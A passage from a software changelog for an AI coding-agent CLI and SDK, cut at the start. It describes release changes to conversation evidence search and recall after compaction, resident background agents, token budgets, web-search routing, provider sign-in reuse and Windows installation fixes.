  Archive bytes, explicit search/read tools and access boundaries are unchanged;
  these labels and ranking do not establish truth or independent corroboration.

- 612879e: Recover text blocks in compacted tool results that also contain images or
  documents. Scoped conversation search and exact reads now include those blocks
  after compaction and restart, without mixing binary bytes or inserted separators
  into the text. Existing plain-text part addresses keep pointing to the same
  content. Newly written large archives retain the additional text parts; old
  archives are not rewritten. Unindexed legacy scans report skipped block arrays
  as incomplete instead of claiming a complete search. No configuration changes
  are required; automatic CLI recall remains opt-in.
- e7bc7a1: When optional conversation query planning finds competing referents, preserve
  that interpretation for the main model instead of silently skipping recall.
  A temporary note carries validated quotes and asks the model to clarify if
  needed; it is labelled as a fallible interpretation, not historical evidence.
  No subject is selected for automatic retrieval in this case. The note shares
  the existing context allowance and cancellation, and new operator input clears
  the cached interpretation. SDK defaults and CLI configuration keys are unchanged.
- 3e09024: Learning candidates and learning cycles can declare `purpose: 'exploration'` for instructions intended to improve an explorer. Their purpose is covered by the content digest, and generation cannot redirect the host-admitted purpose. A skill cannot change purpose under the same name.

  `projectResidentLearning` continues to select task guidance by default. Exploration policies require an explicit matching purpose and are reported as `different-purpose` when withheld. Existing skills without a purpose retain their task behavior and hashes. CLI resident steps therefore keep exploration policies out of ordinary task context. Explicit exploration projection still requires matching source revisions and does not grant tools or start inference.

- d1be0be: Stabilize goal conversation UI tests by waiting for the enabled composer before
  typing commands, including after conversation replacement. Tests continue to
  exercise durable goal ordering and automatic continuation without increasing
  timeouts or changing CLI behavior.
- 43124f0: When automatic evidence query resolution is enabled, allow its existing bounded
  planner to select grounded subject words for discovery. A named record can now
  focus the search without generic field words filling context with other records.
  Source spelling, quoted context and every candidate's conversation ownership
  are validated before use.

  Temporary context reports the selected focus, observed focus words and locally
  excluded passages. An empty focused scan is explicitly not proof of archive
  absence. Explicit conversation search/read tools remain available with their
  existing semantics; no additional model call or retrieval budget is introduced.
  SDK query resolution remains opt-in. CLI integration checks cover archived
  observations after reopening a conversation.

- e40044b: Correct evidence-source guidance for questions about earlier observations. The SDK coding-agent doctrine now distinguishes retained historical content from current workspace reads, preserves exact identifiers in reports and requires unavailable history to be reported honestly. Recorded CLI turns explain how to recover clipped details with their conversation search/read tools, before compaction as well as after restart. The guidance is omitted when those tools are unavailable and remains stable across a run. Search responses explicitly distinguish remaining pages from unavailable evidence so a matching announcement is not confused with the original observation. Storage, permissions, retrieval bounds and freshness checks for edits are unchanged.
- 6446182: Fix opt-in evidence query planning failing when a model rewrites a word's
  spelling or inflection. The internal planner selects numbered words supplied
  by the host; retrieval receives the original spellings after quote validation.
  The vocabulary shares the existing 12,000-character preparation allowance,
  offers at most 256 distinct spellings, and reports omissions. Each plan still
  selects at most 16 words. Literal retrieval remains the SDK default, and the
  CLI's existing query-resolution opt-out remains available.

  Keep present-state plans from expanding with historical terms. Invalid IDs or
  quotes still reject optional preparation instead of weakening source grounding.
  Update the CLI Session regression for the internal selection protocol.

- 77272e3: Read retained original observations after a process exits before recording a
  terminal run status. Disk evidence factories accept `consistency: 'snapshot'`
  for explicitly scoped nonterminal runs; the existing default remains `closed`.
  Snapshot reads validate ownership and unchanged source bytes on every operation
  without acquiring an execution lease, resuming tools or changing run metadata.

  The CLI now uses this mode for recorded `idle`, `pending` and `running` runs
  outside its requesting live writer. An incomplete final JSONL fragment is
  excluded within the existing bounded I/O allowance without editing the source.
  Search remains incomplete for nonterminal snapshots; a full read describes only
  the selected retained text. File or metadata changes require a fresh search,
  and missing or altered retained originals remain unavailable.

- 5996a84: Recover retained tool text while the same invocation is still running. The SDK adds optional `ToolContext.captureRunEvidence` and `RunStore.captureTextEvidence` capabilities; custom stores need not implement them. Disk events carry additive integrity links so new appends do not invalidate earlier search/read continuations. Scope changes, damaged records and modified retained outputs are refused; torn boundaries remain explicitly incomplete.

  CLI conversation search and read use this capability for the requesting invocation, preserving exact output after compaction without repeating the original action. Live cursors expire when the writer is replaced; start a new search after restart. Closed-run retrieval continues to support durable run/event/part references.

  Conversation search also identifies the originating tool and directs callers to read the full passage, so original observations can be distinguished from prior retrieval excerpts.

- ebfb3b4: Preserve original messages removed by CLI `/compact`, including exact user details
  absent from its summary, for conversation search/read after restart. Failed
  retention keeps the existing conversation; messages whose serialized form exceeds
  3 MiB are refused before replacement.

  SDK consumers handling `compaction_shed.reason` or `ShedPass.reason` exhaustively
  must add the new `manual` case. Both manual compaction helpers accept optional
  `onShed` to await host-owned retention before returning replacement history;
  callback failure rejects the operation. Existing callers without a callback keep
  their projection-only behavior.

- 7168bbf: Avoid returning an underfilled conversation-search response solely because an internal SDK index page ended. Search can follow up to seven internal continuations while preserving its existing requested match count, 12,000-byte match output allowance and 8 MiB read ceiling. Public cursors still resume remaining work, and each internal page revalidates scope and source integrity. A later validation failure removes that run's accumulated matches from the current response; cancellation still aborts the call. Run counts describe distinct runs visited within the response.
- 7182f1b: Fix conversation evidence searches that permanently excluded runs after the
  first 100 directory entries. `search_conversation` now returns a continuation
  for later discovery batches, including empty batches containing no run IDs.
  `read_conversation` and automatic recall keep their existing exact-text,
  ownership, byte and page limits; no tool action is replayed.

  Discovery resources are bounded to 32 scans and 128 cached name pages per
  process and expire after ten minutes. Concurrent reads of one continuation
  share its page. Directory changes require restarting discovery, and CLI
  Session shutdown closes abandoned scans. Batch order is not chronological
  or globally ranked; automatic recall remains opt-in and non-exhaustive.

- c329408: Fix repeated historical observations filling every automatic evidence-recall
  passage slot and excluding a different record such as a correction. Exact equal
  text with the same producer, retention and error status now shares a passage
  before bounded BM25 scoring. Copies retain their separate source addresses;
  changed identifiers, previews and errors remain distinct.

  Request context includes `otherOccurrences` for additional addresses and
  `omittedOccurrences` when the character allowance cannot hold all addresses in
  the retrieved pool. Distinct text takes priority over extra addresses. No archive
  record is removed, no current-state or cross-run chronology is inferred, and
  explicit search/read tools are unchanged. CLI automatic recall remains opt-in
  with `compaction.recallEvidence: true`; no read or passage limits increase.

- e1b8bc7: Fix live evidence continuations incorrectly reporting an exhaustive search
  after automatic recall had encountered a preview or unavailable original.
  The continuation now retains omissions from the same live scan, even when its
  remaining pages contain only valid records and are fully consumed.

  `unavailableRuns` remains a count for the current call. A final page can have
  zero new unavailable runs while `incomplete` remains true because an earlier
  record was missing. Healthy scans still finish normally; a separate historical
  scan's omissions do not taint the live cursor. No additional reads, model calls,
  action replay or broader access are introduced.

- 10e9984: Add optional `RunEvidenceSearchOptions.excludeSuccessfulTools` to omit successful
  results from up to 16 exact tool names during bounded discovery. The default
  excludes nothing. Filter membership is bound to continuations; exact reads stay
  available and errors or unknown provenance remain searchable. Search results and
  `EvidenceRecallBatch` can report optional `excludedToolResults`, counting skipped
  visits rather than unique facts. A positive count can produce an explanatory
  recall context even when no passage is selected.

  Preserve tool name and explicit error status in compacted text when the same
  record contains an unambiguous, correctly ordered call/result pair. Newly written
  large compaction archives retain that metadata; older archives without it stay
  unknown. Text addresses, original messages and copy timestamps are unchanged.

  When CLI automatic evidence recall is enabled, successful `search_conversation`
  and `read_conversation` results no longer occupy its initial candidate slots,
  allowing original observations behind repeated archive quotes to be considered.
  Automatic cursors preserve this filter. Start a new literal search without that
  cursor to inspect the quoted search/read results. This fixes candidate pollution
  without increasing budgets or changing the default-disabled recall option.

- 4801a6f: Automatic evidence recall now recognizes text already present in tool text
  blocks and earlier preparation stages. Those passages receive source references
  instead of occupying slots intended for missing information. Images, documents
  and private reasoning are not treated as visible text, and separate blocks are
  never joined to invent a matching passage. Existing scope validation, context
  limits and opt-in behavior are unchanged.

  CLI automatic discovery can fill a candidate page from several completely
  searched runs, within the same byte, output and page limits. It no longer
  spends one automatic page on every small matching run. Explicit literal
  searches retain their early return; unfinished source pages still require
  continuation. Serialized matches, including escaping, share the output cap.

- b9e0f37: Add the experimental `refineEvidenceRecallTerms` SDK helper for bounded lexical
  coverage checks. Hosts can use the returned strict query subset to search terms
  missing from candidate excerpts without introducing another model call.

  When `compaction.recallEvidence` is enabled, the CLI spends existing retrieval
  pages on uncovered terms so frequent words are less likely to hide an earlier
  observation. Original and focused cursors retain their own query and omission
  state. The four-page, two-live-page and 8 MiB read limits remain in force;
  explicit conversation searches retain literal matching. No configuration or
  stored-data migration is required.

- 2bcf017: Improve automatic resident evidence selection when a long objective/summary
  loses its subject or frequent matches hide a rarer requested observation.
  Selection samples both ends of bounded fields and can spend existing search
  pages on uncovered query words. Original and corrected observations retain
  separate provenance; ambiguous references are not silently resolved.

  Disk evidence sources and the resident source factory now advertise
  `supportsTermRefinement`. SDK callers can supply `refineTerms` with an existing
  token-search cursor to branch a strict subset at its authenticated position.
  Returned cursors use the subset; the original broad cursor remains valid.
  Scope, filters, read ceilings and automatic page/context limits stay enforced.
  Custom sources without this capability use a fresh subset search; the resident
  factory restarts within the selected invocation when its resolved backend
  cannot refine a cursor.

- e63ca83: Add `PrepareStepResult.context` for current observations carried after history in a labelled runtime message for this request only. It is separate from `system` authority, counted in subsequent stages' context estimates, and never replaces operator intent or accumulates in conversation history.

  The emitted `RuntimeContextMessageKind` union now includes `step-context`. Consumers with exhaustive switches or records over that exported union must handle the new kind as runtime-generated context, not operator input. This is the SDK's breaking surface; existing `prepareStep.system` callers retain their behavior.

  The CLI moves its changing context inventory into this field. OpenAI and Anthropic request conversion no longer moves that inventory ahead of conversation history as system text. This preserves history placement without promising cache hits or reduced billed tokens.

  Anthropic message caching now places its breakpoint before request-only step context, so the cached boundary ends on stable history rather than the inventory that changes next step. Requests without step context keep their existing breakpoint.

- 52f2d09: Resumed conversations and earlier-prompt forks no longer show blank assistant
  rows for tool-only messages. Retained public commentary and final-answer items
  are restored as separate entries when they still match the saved answer. Edited
  or compacted content takes precedence over stale parts. Tool results and provider
  replay state remain unchanged for the next model request.
- 2e93158: Preserve full permitted shell output before condensing similar lines. Previously,
  condensation happened before retention, so omitted row values could be lost even
  though conversation search reported the stored result as complete. Historical
  search and reads can now recover those originals without repeating the command.

  Compact output carries its recovery path. Authenticated retention may also write
  an artifact for a condensed result below the normal size cap. If retention fails,
  the ordinary bounded original is shown instead; hook-redacted text stays redacted.

- 1d651d0: Keep large compacted histories searchable, including short user text attached to
  large images and individual long text messages. The disk store writes a bounded
  `compaction_archive` storage record and saves original messages and authenticated
  text chunks under the run's `compaction-output/` directory. Full SDK event readers
  restore the original `compaction_shed` event with its attachments and metadata.

  Raw JSONL consumers must handle this new storage record or switch to
  `RunDiskStore.readEvents()` / `readRunEventsIn()`. Preserve `compaction-output/`
  with the transcript when copying a run. Upgrade SDK readers before consuming new
  archives. Existing inline records remain readable; older oversized records are
  not converted automatically.

  CLI manual compaction now offloads messages above 3 MiB instead of refusing them.
  Automatic compaction and scoped search/read use the same SDK mechanism. Archive
  write failures and limits still prevent the history replacement.

- 281859f: Correct recovery guidance in shortened tool output. The kernel no longer assumes that workspace `read`/`grep` tools can open internal retained-output paths. It directs recovery through the host-authorized tools and distinguishes the saved observation from a fresh read of its source. Existing permissions, exact retention and preview limits are unchanged; previously recorded previews are not rewritten.
- c795e3f: Read an already located conversation passage directly through its authenticated
  SDK address instead of searching index pages again. This removes an unnecessary
  empty read page after late search matches. Source ownership and bytes are checked
  again on every read; changed evidence is refused.

  The host retains at most 128 locations for ten minutes without retaining their
  payloads. Expiry, eviction or restart falls back to the existing bounded lookup
  using the same run/sequence/part address. Closing a conversation now releases
  both search and read cursors, as well as these temporary locations.

- 0fa8941: Allow a host to bound a resident tool-evidence operation across history,
  invocation resolution and archive reads with `maxReadBytes`. Configure the
  source's `resolutionReadBytes` with a host-enforced document-read ceiling;
  bounded calls refuse to proceed without that declaration. Their `chargedBytes`
  includes the declared resolution allowance, and a failed source search without
  a byte receipt conservatively consumes the remainder. Calls without the new
  option retain their separate existing limits.

  The CLI declares the existing size bounds of its two attempt receipts, making
  its source usable by bounded host retrieval. This does not enable automatic
  resident recall yet. Returned pages must match their resolved invocation's
  tenant/project/Session/run identity, and cancelled reads cannot expose a late
  backend result. Custom sources must honor the read limits they accept.

- 3c60512: Add optional writer-owned `PersistedRunEvent.previousTextRecord` links for live
  text retrieval. Bounded searches can reach earlier observations without spending
  their record allowance on intervening nontext lifecycle events. Operational JSONL
  records and adjacent links remain intact. Missing text links retain adjacent
  traversal, and malformed content or incomplete history cannot be skipped as if
  the archive were complete.

  The CLI's opt-in automatic evidence recall benefits from these links within its
  existing page and byte limits. No extra model call or tool action replay is used.
  This is selected-text integrity checking, not a full audit of skipped operational
  records; the `compaction.recallEvidence` default remains off.

- 6c682d8: Text evidence searches accept `excludeDerivedSummaries`, defaulting to false.
  This excludes only explicitly marked compaction summaries, binds the selection
  into cursors, and reports `excludedSummaries` as skipped part visits. Summary
  text remains available through unfiltered searches and exact reads.

  When a partial automatic CLI evidence page contains derived summaries, the host
  can spend its existing refinement page on source records instead. The general
  cursor and already retrieved summaries are preserved. This helps discovery reach
  original observations behind repeated summaries without increasing the four-page,
  8 MiB read or context allowances. Explicit tool continuations restore the exact
  filter; new literal searches remain unfiltered. An incomplete scan still cannot
  establish absence.

- 656e79d: Add optional cancellation signals to `ToolContext.captureRunEvidence` and
  `RunStore.captureTextEvidence`. Existing implementations that accept fewer
  arguments remain compatible; custom stores should observe the supplied signal
  to stop their own I/O promptly.

  Tool evidence capture now observes the tool's deadline and nested dispatch
  cancellation, and refuses use after the tool call settles even if its parent
  run is still working. Cancelling a local read leaves other calls available.
  Queued cancelled captures are skipped without releasing a writer lock early.
  An uncooperative custom store can still delay later appends until its pending
  operation settles, although the cancelled caller stops waiting immediately.
  CLI conversation search and exact reads also forward their operation signal
  when capturing live evidence.

- 3c6326f: Prevent checkpoint resume from repeating a tool that started but never recorded
  its completion. Previously, resuming a partially completed batch could execute
  such a call again, duplicating an external effect. The resumed conversation now
  receives an explicit unknown outcome and can verify current state before further
  work. Completed calls remain recovered and proven unstarted calls can continue.

  Add optional `RunStore.readToolExecutions` and exported `ToolExecutionSnapshot` /
  `ToolExecutionRecord` types. Disk and memory stores implement the scan; custom
  stores without it use their strict `readEvents` contract. Missing or contradictory
  execution evidence does not authorize replay. The disk scan has documented size
  bounds; exceeded bounds produce unknown outcomes instead of automatic re-execution.

  Explicitly answered durable questions may still re-enter their own asking tool,
  without granting the same exception to interrupted siblings.

  CLI `drain` now passes configured run limits to its resume host. Previously a
  bounded run could fail with a token-budget root-limit mismatch because `drain`
  silently used an unlimited limit. Keep the original token limit in configuration;
  the existing ledger still enforces its spent allowance.

- 3c6ef94: Validate returned archive pages before exposing their text or caching an address.
  Conversation search, exact reads and automatic recall now consistently reject
  pages with mismatched ownership, invalid retrieval bounds or inconsistent text
  positions. Exact reads also reject a wrong sequence/part during address lookup
  and discard results returned after cancellation. Faulty captured sources report
  unavailable evidence instead of contributing text to the conversation. Existing
  built-in storage integrity checks and retrieval limits are unchanged.
- f3b377e: Project bounded file-evidence references and owned worker status into model requests. A successful write body is referenced only while its complete call input and receipt remain visible and match the conversation's observation fingerprint. Existing disk-drift checks still run before mutations. Observations without content now invalidate an earlier fingerprint instead of carrying it forward.

  `FileReadTracker.recordRead` accepts an optional third argument for a successful full-body write's tool-call ID, exposed through the optional `writeCallId` method. The built-in tracker preserves this witness across identical observations and clears it on changed or unknown content. Existing custom trackers remain valid; trackers without the witness do not enable the new file reference projection.

  Add `CompletionInbox.describeOwnedWork()` for a non-consuming snapshot of up to sixteen owned tasks, separating scheduler state from delivery to history. The runtime uses it to keep available results visible after operator steering; delivery does not claim that a user-facing synthesis was produced. No automatic relaunch, answer-verification inference or persisted duplicate transcript is added.

- fd0d270: Automatic evidence recall now retains bounded source references for exact text already visible in conversation history. The temporary context can contain `visibleEvidence` entries binding an exact bounded `textQuote` to an `address` for a host archive-read tool, recording time when known, source and retention/error metadata. `omittedVisibleEvidence` reports references withheld by the existing character limit. Quotes repeat at most 512 UTF-16 units to make the source association explicit; full records remain available through the read address. Visible quotes and new passages share `maxPassages`, with new text taking priority.

  An otherwise complete recall pass may now return source metadata even when all matching text is already visible. Consumers should not assume every recall block contains new passage text. New-text ranking is independent of visible copies, and source ownership, revalidation, read limits and cancellation remain enforced. CLI models can use each reference's `address` with `read_conversation` to recover the exact source association without searching again or replaying an action.

- Updated dependencies [40651dd]
- Updated dependencies [b156888]
- Updated dependencies [7bb8163]
- Updated dependencies [2d26b44]
- Updated dependencies [6663561]
- Updated dependencies [2a1e0e5]
- Updated dependencies [ce55c21]
- Updated dependencies [9463b6f]
- Updated dependencies [de53442]
- Updated dependencies [6e4a820]
- Updated dependencies [28d3874]
- Updated dependencies [985db49]
- Updated dependencies [eb2e7ba]
- Updated dependencies [bd4bd2e]
- Updated dependencies [fe6e0fb]
- Updated dependencies [bb0281b]
- Updated dependencies [cff2b6a]
- Updated dependencies [df686fc]
- Updated dependencies [e954d02]
- Updated dependencies [2869fbe]
- Updated dependencies [b1e3bc5]
- Updated dependencies [df143c8]
- Updated dependencies [45c8292]
- Updated dependencies [6e14db9]
- Updated dependencies [6a6921c]
- Updated dependencies [691342c]
- Updated dependencies [d5d2b9a]
- Updated dependencies [b971796]
- Updated dependencies [e9a4192]
- Updated dependencies [612879e]
- Updated dependencies [e7bc7a1]
- Updated dependencies [b2d5b01]
- Updated dependencies [3e09024]
- Updated dependencies [f49a4b8]
- Updated dependencies [43124f0]
- Updated dependencies [e40044b]
- Updated dependencies [6446182]
- Updated dependencies [0a0baf2]
- Updated dependencies [c4aaf9b]
- Updated dependencies [77272e3]
- Updated dependencies [7579aa0]
- Updated dependencies [5996a84]
- Updated dependencies [ebfb3b4]
- Updated dependencies [4828eb0]
- Updated dependencies [97acc32]
- Updated dependencies [c329408]
- Updated dependencies [b649224]
- Updated dependencies [10e9984]
- Updated dependencies [4801a6f]
- Updated dependencies [b9e0f37]
- Updated dependencies [2bcf017]
- Updated dependencies [e63ca83]
- Updated dependencies [830f81e]
- Updated dependencies [6394010]
- Updated dependencies [f4b3ffb]
- Updated dependencies [9a4877a]
- Updated dependencies [f92daf8]
- Updated dependencies [22203b0]
- Updated dependencies [5d31eea]
- Updated dependencies [9ea5074]
- Updated dependencies [f1e33a1]
- Updated dependencies [2e93158]
- Updated dependencies [1d651d0]
- Updated dependencies [b888779]
- Updated dependencies [281859f]
- Updated dependencies [d1a6ce5]
- Updated dependencies [d81aca6]
- Updated dependencies [61aab1f]
- Updated dependencies [ea5367d]
- Updated dependencies [0fa8941]
- Updated dependencies [3c60512]
- Updated dependencies [8095541]
- Updated dependencies [6c682d8]
- Updated dependencies [bdf923d]
- Updated dependencies [656e79d]
- Updated dependencies [3c6326f]
- Updated dependencies [0a36260]
- Updated dependencies [f3b377e]
- Updated dependencies [fd0d270]
- Updated dependencies [2869fbe]
  - @namzu/sdk@39.0.0
  - @namzu/openai@3.1.1
  - @namzu/anthropic@5.1.1
  - @namzu/zen@1.0.1
  - @namzu/computer-use@1.4.2
  - @namzu/ollama@2.2.2
  - @namzu/openrouter@2.4.0

## 24.0.0

### Major Changes

- 1efafcb: Resident `run` and `start` now default to a resident-specific context profile
  instead of the interactive coding and plan-mode prompt. Read-only residents
  can complete read-only objectives without being instructed to pause for an
  interactive plan approval. Pass `--context-profile interactive` to preserve
  the previous guidance. Ordinary chat, tool permissions, output validation and
  claim settlement are unchanged.

  The SDK exports `createResidentStepContributions` and `ResidentStepPromptOptions`
  for stable resident guidance and captured invocation-specific continuity through
  the existing prompt registry. Prompt-cache validation now checks rendered
  instructions so replacing content under the same contribution or skill name
  cannot retain stale guidance. Full-prompt cache hits still render once locally.

### Minor Changes

- 09c5993: Add experimental `namzu resident` commands to save, inspect, execute, pause, resume, wake, reconcile and archive project-bound pursuits. Execution reuses the configured CLI runtime, requires a finite step cap and defaults to read-only plan mode; provider/tool/token options apply to each invocation or SDK step as documented. Saved execution directories, last-step summaries and private attempt receipts survive reopening. Interrupted work retains its exact claim and requires explicit inspection before reconciliation; no service, automatic replay, external messaging or ordinary TUI default is enabled.

  Add an optional durable `pauseGeneration` to resident agendas. Each successful `setPaused(true)` increments it, and resume preserves it, allowing a CLI runner to notice even a rapid pause/resume between local checks. SDK agenda writes use schema 5; schemas 1–4 remain readable with an absent generation interpreted as zero. Older writers refuse the new schema rather than drop stop authority. SDK hosts remain opt-in; existing local `ResidentHost.pause()` behavior is unchanged.

- e5bd6a2: Add `ToolRegistry.fork()` and `ToolRegistryForkOptions` to snapshot tool membership and availability independently for a run. Optional `deferExcept` hides currently active schemas until discovery without changing handlers, authorization or the source registry. Definitions and configuration remain shared; this is not a deep clone. Exact short/generic deferred tool names can now be discovered, and scoped prompts only recommend `search_tools` when it is available to that scope.

  Add opt-in `namzu resident run|start --tool-loading deferred` to load optional tool schemas on demand for each step. The default remains `eager`; project instructions, memory recall, continuation evidence, permissions and provider-native search are unchanged. Discovery may require another model response. The internal CLI session option applies to fresh sends, not checkpoint resume.

- b7f6720: Add opt-in `ResidentHostRunOptions.keepAlive` while preserving the default idle-return behavior. A keep-alive invocation retains its original finite step budget and performs no model calls when no work is due; it requires a positive `maxIdleMs`.

  Add `namzu resident start --max-steps <n>` for managed background execution, `stop` for exact-runner drainage, and `release <runner-id> --executor-stopped` for inspected crash recovery. Foreground and background CLI runners share exclusive immutable ownership. Status distinguishes live control replies from unresponsive retained state; failed cleanup does not establish drainage. No OS service or automatic replay is installed. Existing interrupted pursuit claims still require explicit reconciliation.

### Patch Changes

- e376b7c: Fix Windows startup rejecting private CLI state directories whose ACL includes
  the operating system's SYSTEM account (`SY`). The current user must still have
  access; grants to other users or groups remain refused. This fixes a local
  state-permission failure that could appear after selecting a discovered Claude
  session, without requiring another provider sign-in.

  Claude session discovery now honors `CLAUDE_CONFIG_DIR`, including directories
  with spaces. An explicitly selected profile cannot silently fall back to the
  default Claude profile, the paired Windows home, or the default macOS Keychain.
  Custom macOS Keychain entries remain unsupported.

- 63328d0: Fix npm startup failures in Windows provider setup and `namzu upgrade` by running npm's JavaScript entry point with the Node runtime that runs Namzu. Arguments, including installation paths with spaces or shell characters, remain literal. Windows uses the npm bundled with that runtime; if it is absent, Namzu explains how to repair it instead of trying a custom PATH wrapper. Cancelling provider installation requests termination of its Windows process tree and reports if cleanup cannot be confirmed.

  CLI 23.0.0's existing Windows updater cannot acquire this fix itself when it fails with `spawn EINVAL`. Run `npm.cmd install --global @namzu/cli@latest` once using the same Node installation; include `--prefix "<existing-prefix>"` for a custom global prefix. Restart Namzu afterward.

- 3225450: Make the Windows conversation resume hint executable in PowerShell, including Windows PowerShell 5.1. The hint explicitly names PowerShell, quotes paths and arguments literally, and resumes only after a required directory change succeeds.
- 63328d0: Fix Windows startup failing on nested private state directories. Current-user
  access now propagates to new child directories and files instead of leaving
  Windows to assign its default ACL. Protecting a named private directory removes
  an existing Administrators grant, including after an earlier failed startup;
  it does not accept that group or unrelated accounts as private.

  Existing descendant files with explicit grants are not recursively migrated.
  POSIX permissions and credential-file ACL validation are unchanged.

- Updated dependencies [449988e]
- Updated dependencies [09c5993]
- Updated dependencies [0c9c98a]
- Updated dependencies [1efafcb]
- Updated dependencies [f3fa065]
- Updated dependencies [e5bd6a2]
- Updated dependencies [8400937]
- Updated dependencies [44b8dcf]
- Updated dependencies [b7f6720]
  - @namzu/sdk@38.2.0

## 23.0.0

### Major Changes

- 64d9b9b: CLI auto search now selects native live search for supported direct Anthropic and Google API-key models instead of Exa. Native requests use provider quotas and execute without local tool approval. Set `web.backend: exa` to keep the previous common-search behavior on these routes. Unsupported model/endpoint combinations retain common search under auto; cached mode is never silently changed to live.

  Add model/mode-aware hosted-search capability checks, preserve them through provider wrappers, and forward hosted search through ReactiveAgent and delegated runs. Anthropic retains encrypted search blocks and citation indices for unchanged matching-route continuation; Google retains grounding source links. Common search previews omit internal provenance framing while preserving raw results for the model and history.

### Patch Changes

- 3a42206: Reduce common web-search request bursts with a shared queue and stateless Exa calls. Retry transient HTTP failures within a cancellable deadline and report rate-limit waits and exhausted retries clearly.
- 2847265: Make the parent’s configured Exa web search available to delegated agents, including explore agents, while retaining disabled and native-only search settings.

  Keep words intact when wrapping the agent transcript where space permits.

- 99e9c13: Animate the Namzu wordmark during interactive upgrades and fill it on successful installation verification. Keep redirected, quiet, structured, and no-color output static. When animation is active, retain the last 16,384 characters of npm output for failure diagnostics instead of interleaving installer logs with the animation.
- d4ffd86: Animate the Working text itself instead of placing an additional Namzu logo beside it.
- 1e72c50: Show a filling Namzu wordmark while working, with a static composer border. Pause decorative motion for approval prompts and retain compact and accessible terminal output.
- Updated dependencies [786ca01]
- Updated dependencies [786ca01]
- Updated dependencies [64d9b9b]
- Updated dependencies [786ca01]
- Updated dependencies [786ca01]
- Updated dependencies [786ca01]
  - @namzu/sdk@38.1.0
  - @namzu/anthropic@5.1.0
  - @namzu/google@0.3.0

## 22.0.1

### Patch Changes

- 8c6190e: Show `namzu resume <id>` on exit when the executable on PATH matches the running CLI. Preserve explicit executable paths for alternate installations and source launches, and include a directory change only when the conversation uses a different working directory.

## 22.0.0

### Major Changes

- 7785cb4: Web search now defaults to automatic search routing for conversation models, instead of being disabled. A supported native driver is preferred for a single-provider session; other routes use Exa under the normal network-tool permission policy. Neither Exa nor public Zen requires OpenCode installation. The public endpoint has free-tier limits. Set `web.search: off` to retain the old disabled behavior; set `web.backend: native` to use the existing provider-hosted search route instead.

  Add `/config` as an entry to session settings and `/config sources` for configuration provenance. `/status` now presents a compact, wrapping session card including the search backend. `/setup` separates optional CLI installation from account access, offers confirmed npm installation with cancellation, and rechecks installation before connecting.

- 7785cb4: CLI runs and their children no longer default to finite cumulative token limits. Set limits.tokenBudget to 1000000 to retain the previous CLI tree limit. Iteration and cancellation limits remain active; token usage is still recorded.

  Agent accepts model, provider and effort selections for a child without changing the parent conversation. Use agent_models to discover connected model IDs and published capabilities.

  SDK AgentManager now honors explicit configOverrides.tokenBudget: 0 under an unlimited parent instead of substituting 200000. Specify 200000 to retain that previous behavior. TokenBudget.reserve(0) supports unlimited child accounts; finite ancestor budgets remain binding. Omitted SDK child budgets retain their existing fallback.

- 7785cb4: Enabled compaction now deduplicates long, identical read-only text observations
  in model requests by default. The first full result remains; later identical
  results reference it. This changes the content seen by providers and model-call
  hooks, while leaving tool execution and canonical conversation history intact.

  To keep the previous request representation, set `deduplicateObservations: false`
  in SDK compaction configuration, or `compaction.deduplicateObservations: false`
  in CLI configuration. SDK runs without compaction configuration or with the
  `disabled` strategy remain unchanged. Distinct outputs, partial ranges, errors,
  retained results and results of tools not explicitly read-only are not merged.

- 7785cb4: Edits now refuse a file whose captured content fingerprint differs from its
  current contents, even if the requested anchor still matches. This applies to
  local and sandbox edits. Read the changed file again before retrying; unrelated
  external changes no longer silently pass edit admission.

  The interactive CLI retains file observations across turns of a live agent
  session. SDK hosts can share `createFileReadTracker()` through
  `query({ fileReadTracker })` across their conversation's turns. Keep trackers
  isolated by conversation and filesystem; an omitted tracker remains run-local.
  Observations are in memory, not a durable resume record. No atomic exclusion
  of external writers after admission is promised.

- 7785cb4: Stop bundling OAuth application credentials for borrowed Google sessions. Expired sessions now require renewal in their owning CLI, unless GOOGLE_OAUTH_CLIENT_ID and GOOGLE_OAUTH_CLIENT_SECRET are explicitly configured for the application that issued the refresh token. Fresh owner sessions and API-key access continue to work.

### Minor Changes

- 7785cb4: CLI adds agent_task_list for the invoking run's delegated work, separate from planning tasks. Budget-stopped child results are reported as incomplete rather than successful completion; notifications explicitly distinguish lifecycle termination from task success. The agent browser uses the terminal height and preserves the main draft while its composer is hidden.
- 7785cb4: Add cancel_agent to request cancellation of one owned running or queued child without cancelling the parent or its other tasks. Finished tasks return their existing status. Confirm termination through agent_task_list or wait_for_task; acceptance alone is not completion. Unresolved provider usage still follows the shared token ledger's admission policy.

  Load catalogue-backed reasoning profiles before validating or executing explicitly selected child effort, fixing rejected low-effort Codex delegations on fresh provider instances.

- 7785cb4: Add optional exploration presentation metadata to tool call views. The CLI groups consecutive successful file observations while preserving their complete retained output behind Ctrl+O. CLI tool-end events additionally expose retained `output` before preview formatting, so hosts can recover exact text. Background job calls now identify the operation and job. Failures remain visible outside compact groups.

  Fix grep returning no matches when its path names a regular file. Local and guest traversal now search that file without enumerating its parent.

- 7785cb4: Retain session-scoped agent receipts across CLI restarts. Resumed conversations receive a bounded summary of earlier tasks; `agent_task_list` accepts `history: true` and an optional `task_id` to inspect saved outcomes and result previews without launching another agent. Tasks without a terminal receipt remain explicitly unresolved, not falsely running or completed. This does not automatically restart child processes.
- 7785cb4: Add Google model access with a native SDK provider and CLI model selection. Reuse an existing Gemini CLI Google sign-in from this device, including the paired Windows home under WSL, without requiring a new API key. Explicit Gemini or Google API keys remain an alternative and take precedence when configured. Borrowed sign-ins are refreshed in memory without rewriting their owner file; Google account access retains the Code Assist route rather than being sent to the API-key endpoint.
- 7785cb4: Enable provider-hosted web search with `web.search: live` or `cached` in CLI configuration, or `webSearch: { mode: 'live' | 'cached' }` in SDK run/completion parameters. Search remains off by default. Currently the Codex subscription driver supports it; unsupported provider routes refuse explicitly. Hosted searches display activity and retain source links and native replay evidence without executing local shell commands. Enabling this setting authorizes server-side searches without per-search local-tool approval. Model token usage remains accounted in the enclosing request; separate search fees are not measured by the token ledger.

  SDK event consumers can handle the new `hosted_tool` event (`hosted.tool` on SSE). These observations never request local tool execution.

- 7785cb4: An unresolved provider receipt no longer blocks healthy sibling accounts whose shared ancestors are unlimited. Finite shared allowances remain blocked, as does the account owning the unresolved receipt. To retain tree-wide blocking on unknown spend, configure a finite root token budget. Invalid accounting and failed persistence still block the entire tree.

  Snapshots retain uncertainty on individual request records via unresolved; only explicit final-receipt reconciliation clears it. Cold restore marks pending requests unresolved. TokenBudgetSummary adds unresolvedRequests; poisoned now reports whether the observed account is blocked. CLI usage identifies incomplete measured totals instead of implying that unknown usage was free.

### Patch Changes

